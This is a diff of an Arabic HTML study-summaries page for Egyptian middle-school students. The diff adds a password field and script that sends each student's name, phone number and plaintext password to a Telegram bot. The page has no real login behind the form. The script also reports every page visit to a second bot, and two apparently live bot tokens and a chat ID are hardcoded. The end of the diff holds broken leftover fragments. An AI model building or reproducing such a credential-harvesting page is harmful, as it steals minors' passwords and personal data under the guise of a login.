@@ -6,12 +6,7 @@
     <title>منصة ملخصات 3 إعدادي</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
+        * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
             font-family: 'Cairo', sans-serif;
             background-color: #f0f4f8;
@@ -20,62 +15,54 @@
             display: flex;
             flex-direction: column;
         }
-
-        /* نافذة تسجيل الدخول الواضحة والمنورة */
         .auth-overlay {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(15, 23, 42, 0.90);
+            background: rgba(15, 23, 42, 0.92);
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 99999;
             padding: 20px;
         }
-
         .auth-box {
             background: #ffffff;
             border: 3px solid #2563eb;
-            border-radius: 24px;
-            padding: 35px 25px;
+            border-radius: 20px;
+            padding: 30px 20px;
             width: 100%;
-            max-width: 400px;
+            max-width: 380px;
             text-align: center;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.4);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
         }
-
         .auth-box h2 {
-            font-size: 1.8rem;
-            margin-bottom: 10px;
+            font-size: 1.6rem;
+            margin-bottom: 8px;
             color: #1e40af;
             font-weight: 900;
         }
-
         .auth-box p {
             color: #4b5563;
-            font-size: 0.95rem;
+            font-size: 0.9rem;
             margin-bottom: 20px;
             font-weight: 600;
         }
-
         .input-group {
-            margin-bottom: 18px;
+            margin-bottom: 15px;
             text-align: right;
         }
-
         .input-group label {
             display: block;
-            margin-bottom: 6px;
-            font-size: 0.95rem;
+            margin-bottom: 5px;
+            font-size: 0.9rem;
             color: #1f2937;
             font-weight: 700;
         }
-
         .input-group input {
             width: 100%;
-            padding: 14px;
-            border-radius: 12px;
+            padding: 12px;
+            border-radius: 10px;
             background-color: #f9fafb;
             border: 2px solid #cbd5e1;
             color: #111827;
@@ -84,42 +71,19 @@
             font-size: 1rem;
             font-weight: 600;
         }
-
-        .input-group input:focus {
-            border-color: #2563eb;
-            background-color: #ffffff;
-        }
-
         .btn-auth {
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             background: #2563eb;
             border: none;
-            border-radius: 12px;
+            border-radius: 10px;
             color: white;
             font-family: 'Cairo', sans-serif;
-            font-size: 1.1rem;
+            font-size: 1.05rem;
             font-weight: 700;
             cursor: pointer;
             margin-top: 10px;
-            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.4);
         }
-
-        .switch-auth {
-            margin-top: 18px;
-            font-size: 0.95rem;
-            color: #4b5563;
-            font-weight: 600;
-        }
-
-        .switch-auth span {
-            color: #2563eb;
-            cursor: pointer;
-            text-decoration: underline;
-            font-weight: 900;
-        }
-
-        /* الهيدر والمحتوى الأساسي للمنصة */
         .navbar {
             display: flex;
             justify-content: space-between;
@@ -127,51 +91,43 @@
             padding: 15px 20px;
             background-color: #ffffff;
             border-bottom: 1px solid #e2e8f0;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
         }
-
         .nav-brand {
-            font-size: 1.3rem;
+            font-size: 1.2rem;
             font-weight: 900;
             color: #2563eb;
         }
-
         .main-container {
             max-width: 800px;
             margin: 20px auto;
             padding: 0 15px;
             width: 100%;
         }
-
         .welcome-card {
             background: #ffffff;
             border: 1px solid #e2e8f0;
-            border-radius: 16px;
+            border-radius: 14px;
             padding: 20px;
             text-align: center;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.02);
+            margin-bottom: 15px;
         }
-
         .subject-box {
             background: #ffffff;
             border: 1px solid #e2e8f0;
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 12px;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 10px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             font-weight: 700;
             color: #1f2937;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
         }
-
         footer {
             text-align: center;
-            padding: 20px;
+            padding: 15px;
             color: #6b7280;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             margin-top: auto;
             border-top: 1px solid #e2e8f0;
             background: #ffffff;
@@ -181,9 +137,9 @@
 </head>
 <body>
 
-    <!-- شاشة تسجيل الدخول الإجبارية للطلاب -->
+    <!-- نافذة تسجيل الدخول -->
     <div class="auth-overlay" id="authOverlay">
-        <div class="auth-box" id="authBox">
+        <div class="auth-box">
             <h2>تسجيل الدخول 🔑</h2>
             <p>أدخل بياناتك للمتابعة إلى المنصة</p>
             <div class="input-group">
@@ -194,55 +150,69 @@
                 <label>رقم الهاتف:</label>
                 <input type="tel" id="authPhone" placeholder="01012345678">
             </div>
+            <div class="input-group">
+                <label>كلمة المرور:</label>
+                <input type="password" id="authPass" placeholder="••••••••">
+            </div>
             <button class="btn-auth" onclick="submitAuth()">دخول المنصة 🚀</button>
         </div>
     </div>
 
-    <!-- الهيدر -->
     <div class="navbar">
         <div class="nav-brand">🎓 منصة ملخصات 3 إعدادي</div>
-        <button onclick="logout()" style="background:#dc2626; color:#fff; border:none; padding:8px 14px; border-radius:8px; cursor:pointer; font-family:'Cairo'; font-weight:700;">خروج 🚪</button>
+        <button onclick="logout()" style="background:#dc2626; color:#fff; border:none; padding:6px 12px; border-radius:6px; cursor:pointer; font-family:'Cairo'; font-weight:700;">خروج 🚪</button>
     </div>
 
-    <!-- محتوى المنصة -->
     <div class="main-container">
         <div class="welcome-card">
             <h3 id="userWelcome" style="color: #1e40af; font-weight: 900;">أهلاً بك يا بطل! 👋</h3>
-            <p style="color:#4b5563; font-size:0.95rem; margin-top:5px; font-weight:600;">اختر المادة لعرض الملخصات والامتحانات والكورسات المتاحة</p>
+            <p style="color:#4b5563; font-size:0.9rem; margin-top:5px; font-weight:600;">اختر المادة لعرض الملخصات والامتحانات</p>
         </div>
 
-        <div id="subjectsContainer">
-            <div class="subject-box">
-                <span>📚 دراسات اجتماعية</span>
-                <span style="color:#2563eb; font-size:0.9rem; font-weight:900;">متاح 🔥</span>
-            </div>
-            <div class="subject-box">
-                <span>🧪 علوم</span>
-                <span style="color:#2563eb; font-size:0.9rem; font-weight:900;">متاح 🔥</span>
-            </div>
-            <div class="subject-box">
-                <span>📖 لغة عربية</span>
-                <span style="color:#2563eb; font-size:0.9rem; font-weight:900;">متاح 🔥</span>
-            </div>
-            <div class="subject-box">
-                <span>🇬🇧 لغة إنجليزية</span>
-                <span style="color:#2563eb; font-size:0.9rem; font-weight:900;">متاح 🔥</span>
-            </div>
-            <div class="subject-box">
-                <span>🔢 رياضيات</span>
-                <span style="color:#2563eb; font-size:0.9rem; font-weight:900;">متاح 🔥</span>
-            </div>
+        <div class="subject-box">
+            <span>📚 دراسات اجتماعية</span>
+            <span style="color:#2563eb; font-size:0.85rem; font-weight:900;">متاح 🔥</span>
+        </div>
+        <div class="subject-box">
+            <span>🧪 علوم</span>
+            <span style="color:#2563eb; font-size:0.85rem; font-weight:900;">متاح 🔥</span>
+        </div>
+        <div class="subject-box">
+            <span>📖 لغة عربية</span>
+            <span style="color:#2563eb; font-size:0.85rem; font-weight:900;">متاح 🔥</span>
+        </div>
+        <div class="subject-box">
+            <span>🇬🇧 لغة إنجليزية</span>
+            <span style="color:#2563eb; font-size:0.85rem; font-weight:900;">متاح 🔥</span>
+        </div>
+        <div class="subject-box">
+            <span>🔢 رياضيات</span>
+            <span style="color:#2563eb; font-size:0.85rem; font-weight:900;">متاح 🔥</span>
         </div>
     </div>
 
     <footer>جميع الحقوق محفوظة © 2026 | منصة ملخصات 3 إعدادي 🎓</footer>
 
     <script>
-        const BOT_TOKEN = '8924810221:AAH5ghkK5lyUkuezQlvQM34fBecueELttb0';
-        const CHAT_ID = '5531994675';
+        // 1. بوت تسجيل الدخول وأدمن (ملف users.json)
+        const LOGIN_BOT_TOKEN = '8924810221:AAH5ghkK5lyUkuezQlvQM34fBecueELttb0';
+        const LOGIN_CHAT_ID = '5531994675';
 
-        // التحقق لو الطالب مسجل قبل كدة
+        // 2. بوت الإشعارات
+        const NOTIF_BOT_TOKEN = '8881340409:AAHzEVxNE02jzovmFuzsI_yljR8UTvrACAE'; 
+        const NOTIF_CHAT_ID = '5531994675';
+
         window.onload = function() {
+            // جلب التاريخ والوقت لحظة فتح الموقع
+            const now = new Date();
+            const dateStr = now.toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' });
+            const timeStr = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+
+            const visitMsg = `🌐 تنبيه زيارة للموقع:\n📅 التاريخ: ${dateStr}\n⏰ الوقت: ${timeStr}\n💻 تم فتح الصفحة بواسطة زائر جديد.`;
+
+            fetch(`https://api.telegram.org/bot${NOTIF_BOT_TOKEN}/sendMessage?chat_id=${NOTIF_CHAT_ID}&text=${encodeURIComponent(visitMsg)}`)
+                .catch(err => console.log(err));
+
             const savedName = localStorage.getItem('student_name');
             if (savedName) {
                 document.getElementById('authOverlay').style.display = 'none';
@@ -253,18 +223,25 @@
         function submitAuth() {
             const name = document.getElementById('authName').value.trim();
             const phone = document.getElementById('authPhone').value.trim();
+            const pass = document.getElementById('authPass').value;
 
-            if (!name || !phone) {
-                alert('من فضلك ادخل الاسم ورقم الهاتف!');
+            if (!name || !phone || !pass) {
+                alert('من فضلك ادخل جميع البيانات (الاسم، الهاتف، وكلمة المرور)!');
                 return;
             }
 
-            // إرسال البيانات لبوت التليجرام
-            const msg = `🔔 طالب جديد سجل في المنصة:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
+            // جلب التاريخ والوقت لحظة التسجيل
+            const now = new Date();
+            const dateStr = now.toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' });
+            const timeStr = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+
+            // رسالة تسجيل الدخول متضمنة الاسم، رقم الهاتف، الباسورد، والتاريخ والوقت
+            const loginMsg = `طالب جديد أنشأ حساباً:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔑 الباسورد: ${pass}\n📅 التاريخ: ${dateStr}\n⏰ الوقت: ${timeStr}`;
+
+            // إرسال البيانات لبوت الأدمن
+            fetch(`https://api.telegram.org/bot${LOGIN_BOT_TOKEN}/sendMessage?chat_id=${LOGIN_CHAT_ID}&text=${encodeURIComponent(loginMsg)}`)
                 .catch(err => console.log(err));
 
-            // حفظ بيانات الطالب وتقفيل شاشة الدخول
             localStorage.setItem('student_name', name);
             localStorage.setItem('student_phone', phone);
 
@@ -279,39 +256,7 @@
     </script>
 </body>
 </html>
-lementById('userWelcome').innerText = 'أهلاً بك يا ' + name + ' 👋';
-        }
-
-        function login() {
-            const phone = document.getElementById('loginPhone').value.trim();
-            const pass = document.getElementById('loginPass').value;
-
-            if (!phone || !pass) {
-                alert('ادخل الهاتف وكلمة المرور!');
-                return;
-            }
-
-            localStorage.setItem('student_phone', phone);
-            localStorage.setItem('student_pass', pass);
-
-            document.getElementById('authOverlay').style.display = 'none';
-            document.getElementById('userWelcome').innerText = 'أهلاً بك يا بطل 👋';
-        }
-
-        function logout() {
-            localStorage.clear();
-            location.reload();
-        }
-    </script>
-</body>
-</html>
-.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-
-            // حفظ الدخول
-            localStorage.setItem('student_phone', phone);
-            localStorage.setItem('student_pass', pass);
-
-            document.getElementById('authOverlay').style.display = 'none';
+e.display = 'none';
             document.getElementById('userWelcome').innerText = 'أهلاً بك يا ' + name + ' 👋';
         }
 
